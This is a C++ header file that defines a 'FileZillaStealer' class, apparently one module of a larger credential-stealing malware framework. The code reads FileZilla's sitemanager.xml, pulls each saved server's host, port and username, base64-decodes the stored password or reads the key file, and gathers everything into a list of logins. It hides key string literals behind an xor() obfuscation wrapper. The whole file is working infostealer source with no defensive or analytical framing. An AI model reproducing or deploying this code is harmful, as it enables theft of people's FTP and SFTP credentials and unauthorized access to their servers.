#pragma once
#include "base.hpp"
#include "pch.hpp"
#include "result.hpp"
#include "util.hpp"
#include <pugixml.hpp>
#include <wolfssl/wolfcrypt/coding.h>

class FileZillaStealer : public AbstractStealer {
public:
  FileZillaStealer(std::filesystem::path path) : path(path) {}

  void steal() override {
    std::string content;
    read_binary_file(path / xor("sitemanager.xml"), content);

    pugi::xml_document doc;
    doc.load_string(content.c_str());

    for (auto &site : doc.child(xor("FileZilla3")).child("Servers").children("Server")) {
      std::string host = site.child_value("Host");
      std::string port = site.child_value("Port");
      std::string user = site.child_value("User");

      std::string password;
      if (site.find_child([](const pugi::xml_node &node) { return strcmp(node.name(), "Pass") == 0; })) {
        std::string encoded = site.child_value("Pass");
        password.resize((encoded.size() * 3 + 3) / 4, 0);
        word32 len = password.size();
        Base64_Decode((const byte *)encoded.c_str(), encoded.size(), (byte *)password.c_str(), &len);
        password.resize(len);
      } else if (site.find_child([](const pugi::xml_node &node) { return strcmp(node.name(), xor("KeyFile")) == 0; })) {
        read_binary_file(site.child_value(xor("KeyFile")), password);
      }

      logins.push_back(Login({host + ":" + port, user, password}));
    }
  }

private:
  std::filesystem::path path;
};